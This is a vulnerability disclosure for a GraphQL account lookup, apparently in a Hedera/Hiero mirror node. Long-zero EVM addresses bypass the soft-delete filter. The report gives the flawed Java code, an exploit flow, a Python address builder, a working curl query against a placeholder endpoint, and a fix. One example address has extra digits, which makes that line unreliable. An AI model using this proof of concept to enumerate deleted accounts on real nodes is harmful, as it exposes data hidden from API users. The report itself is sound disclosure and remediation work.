### Title
Soft-Deleted Entity Bypass via Zero-Prefix EVM Address in GraphQL `getByEvmAddressAndType()`

### Summary
In `EntityServiceImpl.getByEvmAddressAndType()`, when the supplied EVM address has its first 12 bytes set to zero (the Hedera "long-zero" address format), the code routes to `CrudRepository.findById()`, which carries no `deleted is not true` predicate. The two custom repository methods (`findByEvmAddress`, `findByAlias`) both enforce this filter, but the `findById` branch silently omits it, allowing any unauthenticated caller to retrieve the full metadata record of a soft-deleted account by crafting a zero-prefix EVM address from the account's numeric ID.

### Finding Description

**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 34–41:

```java
public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
    byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
    var buffer = ByteBuffer.wrap(evmAddressBytes);
    if (buffer.getInt() == 0 && buffer.getLong() == 0) {          // first 12 bytes == 0
        return entityRepository.findById(buffer.getLong())         // ← no deleted filter
                               .filter(e -> e.getType() == type);
    }
    return entityRepository.findByEvmAddress(evmAddressBytes)      // ← has deleted filter
                           .filter(e -> e.getType() == type);
}
```

**Repository contrast** (`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`):

```java
// Non-zero path — correctly hides deleted entities
@Query("select * from entity where evm_address = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByEvmAddress(byte[] evmAddress);

// Zero-prefix path — inherits CrudRepository.findById(), no deleted predicate
```

**Root cause:** The branch that decodes a long-zero EVM address into a numeric entity ID delegates to the unfiltered `CrudRepository.findById()`. The failed assumption is that all three lookup paths apply the same visibility policy; only the custom query methods do.

**Exploit flow:**
1. Attacker learns (or enumerates) the numeric ID of a deleted account (e.g., `12345`).
2. Attacker constructs a 20-byte zero-prefix EVM address: `0x000000000000000000000000000000000000003039` (last 8 bytes = `12345` as big-endian long).
3. Attacker sends a GraphQL query to the public `/graphql/alpha` endpoint:
   ```graphql
   { account(input: { evmAddress: "0x000000000000000000000000000000000000003039" }) {
       deleted key memo balance obtainer { entityId { shard realm num } } timestamp { from to }
   }}
   ```
4. The service routes to `findById(12345)`, which returns the deleted entity row.
5. The full `Account` object — including `key`, `memo`, `balance`, `obtainer` (the account that received the deleted account's funds), and the active `timestamp` range — is returned in the response.

### Impact Explanation

The GraphQL `Account` type exposes `key`, `memo`, `balance`, `obtainer`, `createdTimestamp`, `expirationTimestamp`, and the `timestamp` validity range for the deleted entity. The `obtainer` field in particular reveals which account absorbed the deleted account's funds — information the `deleted is not true` filter was designed to suppress. The design contract (soft-delete = invisible to API consumers) is broken for any entity whose numeric ID is known or guessable. No authentication is required; the GraphQL endpoint is public.

### Likelihood Explanation

Hedera entity IDs are sequential integers starting from 1. An attacker can trivially enumerate all IDs by iterating the zero-prefix EVM address space (`0x000000000000000000000000<8-byte-id>`). No credentials, special network access, or prior knowledge beyond the public API URL is needed. The attack is fully repeatable and scriptable.

### Recommendation

Add an explicit `deleted` check in the `findById` branch, mirroring the filter already present in `findByEvmAddress` and `findByAlias`. The simplest fix is to add a custom repository method:

```java
@Query("select * from entity where id = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByIdAndNotDeleted(Long id);
```

and replace line 38 in `EntityServiceImpl.java`:

```java
// Before
return entityRepository.findById(buffer.getLong()).filter(e -> e.getType() == type);

// After
return entityRepository.findByIdAndNotDeleted(buffer.getLong()).filter(e -> e.getType() == type);
```

The same fix should be applied to `getByIdAndType()` (line 25), which has the identical omission via the `entityId` input path.

### Proof of Concept

**Precondition:** An account with numeric ID `N` exists in the mirror node database with `deleted = true`.

**Step 1 — Compute the zero-prefix EVM address:**
```python
import struct, binascii
N = 12345
addr = b'\x00' * 12 + struct.pack('>q', N)  # 20 bytes
print("0x" + binascii.hexlify(addr).decode())
# → 0x0000000000000000000000000000000000003039
```

**Step 2 — Send the GraphQL query (no auth required):**
```bash
curl -X POST https://<mirror-node>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "{ account(input: { evmAddress: \"0x0000000000000000000000000000000000003039\" }) { deleted key memo balance obtainer { entityId { num } } timestamp { from to } } }"
  }'
```

**Expected result:** The response returns the full `Account` object for the deleted entity, with `deleted: true` and all metadata fields populated — data that `findByEvmAddress` with the same underlying entity would have suppressed entirely. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)
